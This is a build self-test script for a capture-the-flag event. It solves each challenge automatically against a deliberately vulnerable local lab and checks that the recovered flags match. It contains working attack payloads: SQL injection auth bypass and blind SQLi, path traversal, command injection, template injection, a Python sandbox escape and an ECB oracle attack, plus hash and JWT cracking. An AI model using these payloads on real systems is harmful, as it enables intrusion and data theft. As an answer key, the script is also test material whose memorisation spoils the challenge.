"""
Capture the PEAK - build-time self-test. Solves every camp from the generated
artifacts and checks it recovers the real flag. Exits non-zero on any mismatch
so a broken build fails loudly. Camp 03 is out-of-band (a human marshal), so it
is sanity-checked (marker present) rather than solved to a flag.

Usage:  python3 verify.py <OUT_DIR>
"""
import os
import re
import sys
import json
import time
import base64
import codecs
import hashlib
import subprocess
import urllib.request
import urllib.parse
from pathlib import Path

import warnings
import yaml
import jwt
warnings.filterwarnings("ignore")   # quiet pyjwt key-length notices

OUT = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).resolve().parent.parent / "_build"
ROOT = Path(__file__).resolve().parent.parent
FLAGS = {int(k): v for k, v in yaml.safe_load(open(ROOT / "config" / "flags.yaml"))["flags"].items()}
EVENT = yaml.safe_load(open(ROOT / "config" / "event.yaml"))
CTF = OUT / "ctf"

fails = []


def check(n, got, want=None, note=""):
    want = FLAGS[n] if want is None else want
    ok = (got == want)
    print(f"  camp {n:02d}  {'PASS' if ok else 'FAIL':4}  {note}")
    if not ok:
        fails.append((n, got, want))


def run(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


# ---- 01 encoding ----------------------------------------------------------
def s01():
    blob = [l for l in (CTF / "stage01" / "basecamp.txt").read_text().splitlines()
            if l and not l.startswith("#")][0]
    b64 = base64.b32decode(blob).decode()
    hexs = base64.b64decode(b64).decode()
    r = bytes.fromhex(hexs).decode()
    check(1, codecs.decode(r, "rot13"), note="base32->base64->hex->rot13")


# ---- 02 pcap --------------------------------------------------------------
def s02():
    from scapy.all import rdpcap, Raw
    data = "".join(p[Raw].load.decode("latin1") for p in rdpcap(str(CTF / "stage02" / "ridge.pcap")) if p.haslayer(Raw))
    m = re.search(r"secret=([^&\r\n]+)", data)
    check(2, m.group(1) if m else "", note="tshark follow stream")


# ---- 03 OSINT: flag hidden in EXIF (base64) -------------------------------
def s03():
    r = run(["exiftool", "-s3", "-UserComment", str(CTF / "stage03" / "dropped.jpg")])
    uc = r.stdout.strip()
    m = re.search(r"b64=(\S+)", uc)
    got = base64.b64decode(m.group(1)).decode() if m else ""
    check(3, got, note="EXIF UserComment base64 -> flag")


# ---- 04 steghide ----------------------------------------------------------
def s04():
    notes = (CTF / "stage04" / "notes.txt").read_bytes()
    assert b"passphrase" in notes, "passphrase crib missing from notes.txt"
    r = run(["strings", str(CTF / "stage04" / "notes.txt")])
    mp = re.search(r"passphrase = (\S+)", r.stdout)
    pw = mp.group(1) if mp else ""
    out = OUT / "_s4out.txt"
    run(["steghide", "extract", "-sf", str(CTF / "stage04" / "snowfield.jpg"),
         "-p", pw, "-xf", str(out), "-f"])
    got = out.read_text().strip() if out.exists() else ""
    check(4, got, note=f"steghide pass={pw}")


# ---- 05 blue-channel QR ---------------------------------------------------
def s05():
    ch = OUT / "_s5.png"
    run(["convert", str(CTF / "stage05" / "glacier.png"), "-channel", "B", "-separate", str(ch)])
    r = run(["zbarimg", "-q", "--raw", str(ch)])
    check(5, r.stdout.strip(), note="imagemagick blue + zbarimg")


# ---- 06-09 lab ------------------------------------------------------------
def lab_suite():
    env = dict(os.environ)
    flagdir = OUT / "_flagdir"
    flagdir.mkdir(exist_ok=True)
    loglog = OUT / "_lablogs"
    loglog.mkdir(exist_ok=True)
    env.update({"PEAK_LAB_DATA": str(OUT / "lab"), "PEAK_FLAG_DIR": str(flagdir),
                "PEAK_LAB_LOGS": str(loglog), "PEAK_LAB_PORT": "9099"})
    proc = subprocess.Popen([sys.executable, str(ROOT / "lab" / "app.py")], env=env,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    base = "http://127.0.0.1:9099"
    try:
        for _ in range(40):
            try:
                urllib.request.urlopen(base + "/healthz", timeout=1); break
            except Exception:
                time.sleep(0.25)
        # 06 cookie role (base64-JSON session cookie)
        sess = base64.b64encode(json.dumps({"user": "x", "role": "admin"}).encode()).decode()
        req = urllib.request.Request(base + "/relay/panel", headers={"Cookie": "session=" + sess})
        b6 = urllib.request.urlopen(req, timeout=4).read().decode()
        check(6, _grab(b6), note="robots + base64-json session cookie")
        # 07 sqli
        data = urllib.parse.urlencode({"user": "admin' OR '1'='1' -- ", "pass": "x"}).encode()
        b7 = urllib.request.urlopen(base + "/relay/login", data=data, timeout=4).read().decode()
        check(7, _grab(b7), note="sqli auth bypass")
        # 08 lfi
        trav = "../" * 8 + str(flagdir).lstrip("/") + "/flag8"
        b8 = urllib.request.urlopen(base + "/relay/logs?file=" + urllib.parse.quote(trav), timeout=4).read().decode()
        check(8, b8.strip(), note="path traversal")
        # 09 cmd injection
        inj = urllib.parse.quote(f"127.0.0.1;cat {flagdir}/.diag_9f2a1c")
        b9 = urllib.request.urlopen(base + "/relay/diag?host=" + inj, timeout=10).read().decode()
        m = re.search(r"acqu1redP34k\{[^}]+\}", b9)
        check(9, m.group(0) if m else "", note="command injection")
        # 13 ssti (jinja2 config leak)
        q13 = urllib.parse.quote("{{config.FLAG13}}")
        b13 = urllib.request.urlopen(base + "/relay/greet?name=" + q13, timeout=4).read().decode()
        check(13, _grab(b13), note="ssti config leak")
        # 16 python sandbox escape -> read flag16 (lab wrote it into flagdir)
        payload = ("[c for c in ().__class__.__base__.__subclasses__() "
                   "if c.__name__=='Popen'][0]"
                   "(['cat','%s'],stdout=-1).communicate()[0]" % str(flagdir / ".box_3d9e7b"))
        b16 = urllib.request.urlopen(base + "/relay/sandbox?expr=" + urllib.parse.quote(payload),
                                     timeout=8).read().decode()
        check(16, _grab(b16), note="python sandbox escape")

        # 18 AES-ECB byte-at-a-time
        def oracle(p):
            u = base + "/relay/vault?p=" + urllib.parse.quote(p, safe="")
            return bytes.fromhex(urllib.request.urlopen(u, timeout=4).read().decode().strip())
        BS = 16
        known = b""
        for _ in range(80):
            k = len(known)
            prefix = "A" * (BS - 1 - (k % BS))
            blk = k // BS
            target = oracle(prefix)[blk * BS:(blk + 1) * BS]
            hit = None
            for b in range(32, 127):
                dic = oracle(prefix + (known + bytes([b])).decode("latin1"))
                if dic[blk * BS:(blk + 1) * BS] == target:
                    hit = b
                    break
            if hit is None:
                break
            known += bytes([hit])
            if known.endswith(b"}"):
                break
        check(18, known.decode("latin1", "ignore"), note="ecb byte-at-a-time")

        # 20 blind boolean SQLi
        def ask(cond):
            u = base + "/relay/check?id=" + urllib.parse.quote(cond, safe="")
            return urllib.request.urlopen(u, timeout=4).read().decode().strip() == "YES"
        f20 = ""
        for pos in range(1, 80):
            hit = None
            for c in range(32, 127):
                cond = ("1 AND substr((SELECT note FROM vault WHERE id=1),%d,1)=char(%d)"
                        % (pos, c))
                if ask(cond):
                    hit = chr(c)
                    break
            if hit is None:
                break
            f20 += hit
            if hit == "}":
                break
        check(20, f20, note="blind boolean sqli")
    finally:
        proc.terminate()


def _grab(html):
    m = re.search(r"acqu1redP34k\{[^}]+\}", html)
    return m.group(0) if m else ""


# ---- 10 gatekeeper --------------------------------------------------------
def s10():
    b = CTF / "stage10" / "gatekeeper"
    st = run(["strings", str(b)])
    key_present = "BELAY-ON-9000" in st.stdout
    r = run([str(b), "BELAY-ON-9000"])
    check(10, r.stdout.strip(), note=f"strings leaks key={key_present}, run->flag")
    if not key_present:
        fails.append((10, "key not in strings", "key recoverable via strings/ltrace"))


# ---- 11 md5 crack ---------------------------------------------------------
def s11():
    rows = dict(l.split(":", 1) for l in (CTF / "stage11" / "creds.txt").read_text().splitlines() if ":" in l)
    words = (OUT / "wordlists" / "peak-mini.txt").read_text().splitlines()
    target = rows["relay_admin"].strip()
    cracked = next((w for w in words if hashlib.md5(w.encode()).hexdigest() == target), "")
    check(11, cracked, note="md5 dict crack")


# ---- 12 jwt secret --------------------------------------------------------
def s12():
    token = (CTF / "stage12" / "token.txt").read_text().strip()
    words = (OUT / "wordlists" / "peak-mini.txt").read_text().splitlines()
    secret = ""
    for w in words:
        try:
            jwt.decode(token, w, algorithms=["HS256"]); secret = w; break
        except Exception:
            continue
    check(12, "acqu1redP34k{" + secret + "}" if secret else "", note="jwt HS256 secret crack")


# ---- 14 dns exfil ---------------------------------------------------------
def s14():
    from scapy.all import rdpcap, DNSQR
    pkts = rdpcap(str(CTF / "stage14" / "beacon.pcap"))
    labels = []
    for p in pkts:
        if p.haslayer(DNSQR):
            q = p[DNSQR].qname
            q = q.decode() if isinstance(q, (bytes, bytearray)) else q
            q = q.rstrip(".")
            if q.endswith("exfil.peak"):
                labels.append(q[:-len(".exfil.peak")])
    try:
        got = bytes.fromhex("".join(labels)).decode()
    except Exception:
        got = ""
    check(14, got, note="dns exfil hex reassembly")


# ---- 15 exif-key + steghide -----------------------------------------------
def s15():
    r = run(["exiftool", "-s3", "-UserComment", str(CTF / "stage15" / "summit.jpg")])
    mp = re.search(r"passphrase = (\S+)", r.stdout)
    pw = mp.group(1) if mp else ""
    out = OUT / "_s15out.txt"
    run(["steghide", "extract", "-sf", str(CTF / "stage15" / "summit.jpg"),
         "-p", pw, "-xf", str(out), "-f"])
    got = out.read_text().strip() if out.exists() else ""
    check(15, got, note=f"exif key -> steghide pass={pw}")


# ---- 17 salted sha256 -----------------------------------------------------
def s17():
    rows = {}
    for line in (CTF / "stage17" / "shadow.txt").read_text().splitlines():
        parts = line.split(":")
        if len(parts) == 3:
            rows[parts[0]] = (parts[1], parts[2])
    words = (OUT / "wordlists" / "peak-mini.txt").read_text().splitlines()
    h, salt = rows["summit_root"]
    cracked = next((w for w in words
                    if hashlib.sha256((w + salt).encode()).hexdigest() == h), "")
    check(17, "acqu1redP34k{" + cracked + "}" if cracked else "", note="salted sha256 dict crack")


# ---- 19 keygen-me ---------------------------------------------------------
def s19():
    serial = "".join(chr(ord("A") + ((i * 7 + 3) % 26)) for i in range(16))
    b = CTF / "stage19" / "keygen"
    got = run([str(b), serial]).stdout.strip()
    st = run(["strings", str(b)]).stdout
    leaked = (FLAGS[19] in st) or (serial in st)
    check(19, got, note=f"keygen reverse (strings-clean={not leaked})")
    if leaked:
        fails.append((19, "flag or serial present in strings", "binary must not leak them"))


def main():
    print("== Capture the PEAK :: build self-test ==")
    s01(); s02(); s03(); s04(); s05(); lab_suite(); s10(); s11(); s12()
    s14(); s15(); s17(); s19()
    # cleanup temp
    for p in ["_s4out.txt", "_s5.png", "_s15out.txt"]:
        try:
            (OUT / p).unlink()
        except Exception:
            pass
    if fails:
        print(f"\nFAILED camps: {[f[0] for f in fails]}")
        for n, got, want in fails:
            print(f"  camp {n}: got {got!r} want {want!r}")
        sys.exit(1)
    print("\nALL CAMPS VERIFIED. green build.")


if __name__ == "__main__":
    main()
